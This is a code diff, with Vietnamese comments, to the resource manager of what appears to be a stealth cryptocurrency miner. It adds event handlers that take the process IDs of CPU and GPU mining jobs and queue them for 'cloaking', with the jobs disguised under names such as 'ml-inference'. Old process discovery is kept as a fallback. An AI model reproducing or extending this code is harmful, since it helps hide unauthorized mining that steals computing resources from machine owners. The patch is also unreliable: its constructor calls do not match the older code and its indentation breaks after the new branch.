@@ -238,6 +238,9 @@ class ResourceManager(IResourceManager):
         # Hàng đợi cloaking riêng biệt cho CPU và GPU (theo blueprint)
         self._cpu_cloaking_queue = queue.PriorityQueue()
         self._gpu_cloaking_queue = queue.PriorityQueue()
+
+        # **EventBus subscribe** (đăng ký EventBus) - **PID Propagation Flow Step 2**
+        self._setup_eventbus_subscriptions()
         
         # Hàng đợi cloaking chung (legacy compatibility)
         self.resource_adjustment_queue = queue.PriorityQueue()
@@ -266,6 +269,89 @@ class ResourceManager(IResourceManager):
         Handler cho event 'resource_adjustment'.
         """
         self.logger.debug(f"Nhận event resource_adjustment: {event_data}")
+
+    def _setup_eventbus_subscriptions(self):
+        """Setup EventBus subscriptions cho mining events - PID Propagation Flow Step 2"""
+        try:
+            # Subscribe to CPU mining events
+            self.event_bus.subscribe('channel:cpu', self._on_cpu_mining_event)
+            
+            # Subscribe to GPU mining events
+            self.event_bus.subscribe('channel:gpu', self._on_gpu_mining_event)
+            
+            # Start EventBus listener
+            self.event_bus.start_listening()
+            
+            self.logger.info("✅ EventBus subscriptions established for mining events")
+            
+        except Exception as e:
+            self.logger.error(f"❌ Failed to setup EventBus subscriptions: {e}")
+            # **Fallback** - không crash ResourceManager nếu EventBus thất bại
+
+    def _on_cpu_mining_event(self, payload: Dict[str, Any]) -> None:
+        """Handle CPU mining events - PID Propagation Flow Step 2"""
+        try:
+            event_type = payload.get('event_type')
+            pid = payload.get('pid')
+            
+            if event_type == 'mining_started' and pid:
+                self.logger.info(f"🔨 ResourceManager received CPU mining_started: PID={pid}")
+                
+                # Create MiningProcess object
+                process_name = payload.get('data', {}).get('process_name', 'ml-inference')
+                mining_process = MiningProcess(pid, process_name, False)  # False = CPU
+                
+                # Add to tracking list
+                with self.mining_processes_lock:
+                    self.mining_processes.append(mining_process)
+                
+                # **register_pid** (đăng ký PID) với CPU plugins
+                self._register_cpu_pid(pid)
+                
+                # **enqueue_cloaking** (xếp hàng cloaking)
+                self.enqueue_cloaking(mining_process)
+                
+                self.logger.info(f"✅ CPU PID {pid} processed: registered + enqueued for cloaking")
+                
+        except Exception as e:
+            self.logger.error(f"❌ Error handling CPU mining event: {e}")
+
+    def _on_gpu_mining_event(self, payload: Dict[str, Any]) -> None:
+        """Handle GPU mining events - PID Propagation Flow Step 2"""
+        try:
+            event_type = payload.get('event_type')
+            pid = payload.get('pid')
+            
+            if event_type == 'mining_started' and pid:
+                self.logger.info(f"🎮 ResourceManager received GPU mining_started: PID={pid}")
+                
+                # Create MiningProcess object
+                process_name = payload.get('data', {}).get('process_name', 'inference-cuda')
+                mining_process = MiningProcess(pid, process_name, True)  # True = GPU
+                
+                # Add to tracking list
+                with self.mining_processes_lock:
+                    self.mining_processes.append(mining_process)
+                
+                # **enqueue_cloaking** (xếp hàng cloaking)
+                self.enqueue_cloaking(mining_process)
+                
+                self.logger.info(f"✅ GPU PID {pid} processed: enqueued for cloaking")
+                
+        except Exception as e:
+            self.logger.error(f"❌ Error handling GPU mining event: {e}")
+
+    def _register_cpu_pid(self, pid: int) -> None:
+        """Register PID với CPU plugins - extracted from existing code"""
+        try:
+            from .resource_control import CPUResourceManager
+            
+            cpu_mgr = CPUResourceManager({}, self.logger)  # singleton; config rỗng vì đã init
+            cpu_mgr.register_pid(pid)
+            self.logger.debug(f"✅ CPU PID {pid} registered with CPU plugins")
+            
+        except Exception as exc:
+            self.logger.debug(f"❌ Không thể register_pid cho CPU plug-ins (PID={pid}): {exc}")
 
     def enqueue_cloaking(self, process: MiningProcess) -> None:
         """
@@ -576,36 +662,43 @@ class ResourceManager(IResourceManager):
                         self.logger.error("Timeout khi acquire lock discover_mining_processes.")
                         continue
 
-                    self.mining_processes.clear()
+                    # **FALLBACK ONLY** - Chỉ chạy nếu chưa nhận PID từ EventBus
+                    received_pids_from_eventbus = len(self.mining_processes) > 0
                     
-                    for proc in psutil.process_iter(['pid', 'name', 'cmdline']):
-                        try:
-                            process_name = proc.info['name']
-                            cmdline = proc.info['cmdline']
-                            cmdline_str = " ".join(cmdline) if cmdline else ""
-                            mining_process = None
-                            
-                            # Phát hiện CPU mining processes
-                            if cpu_process_name in process_name or cpu_process_name in cmdline_str:
-                                self.logger.info(f"Đã phát hiện CPU mining process: {process_name} (PID={proc.info['pid']})")
-                                prio = self.get_process_priority(process_name)
-                                net_if = self.config.network_interface
-                                mining_process = MiningProcess(proc.info['pid'], process_name, prio, net_if, self.logger)
-                                mining_processes.append(mining_process)
-                                self.mining_processes.append(mining_process)
-                                self.enqueue_cloaking(mining_process)
-                            
-                            # Phát hiện GPU mining processes
-                            elif gpu_process_name in process_name or gpu_process_name in cmdline_str:
-                                self.logger.info(f"Đã phát hiện GPU mining process: {process_name} (PID={proc.info['pid']})")
-                                prio = self.get_process_priority(process_name)
-                                net_if = self.config.network_interface
-                                mining_process = MiningProcess(proc.info['pid'], process_name, prio, net_if, self.logger)
-                                # Đánh dấu đây là GPU process
-                                mining_process._is_gpu = True
-                                mining_processes.append(mining_process)
-                                self.mining_processes.append(mining_process)
-                                self.enqueue_cloaking(mining_process)
+                    if not received_pids_from_eventbus:
+                        self.logger.warning("⚠️ Fallback: No PIDs received from EventBus, using process discovery")
+                        self.mining_processes.clear()
+                        
+                        for proc in psutil.process_iter(['pid', 'name', 'cmdline']):
+                            try:
+                                process_name = proc.info['name']
+                                cmdline = proc.info['cmdline']
+                                cmdline_str = " ".join(cmdline) if cmdline else ""
+                                mining_process = None
+                                
+                                # Phát hiện CPU mining processes
+                                if cpu_process_name in process_name or cpu_process_name in cmdline_str:
+                                    self.logger.info(f"Đã phát hiện CPU mining process: {process_name} (PID={proc.info['pid']})")
+                                    prio = self.get_process_priority(process_name)
+                                    net_if = self.config.network_interface
+                                    mining_process = MiningProcess(proc.info['pid'], process_name, prio, net_if, self.logger)
+                                    mining_processes.append(mining_process)
+                                    self.mining_processes.append(mining_process)
+                                    self.enqueue_cloaking(mining_process)
+                                
+                                # Phát hiện GPU mining processes
+                                elif gpu_process_name in process_name or gpu_process_name in cmdline_str:
+                                    self.logger.info(f"Đã phát hiện GPU mining process: {process_name} (PID={proc.info['pid']})")
+                                    prio = self.get_process_priority(process_name)
+                                    net_if = self.config.network_interface
+                                    mining_process = MiningProcess(proc.info['pid'], process_name, prio, net_if, self.logger)
+                                    # Đánh dấu đây là GPU process
+                                    mining_process._is_gpu = True
+                                    mining_processes.append(mining_process)
+                                    self.mining_processes.append(mining_process)
+                                    self.enqueue_cloaking(mining_process)
+                    else:
+                        self.logger.info("✅ EventBus PID propagation working - skipping process discovery fallback")
                             
                             # Cập nhật process states
                             if mining_process and mining_process.pid not in self.process_states:
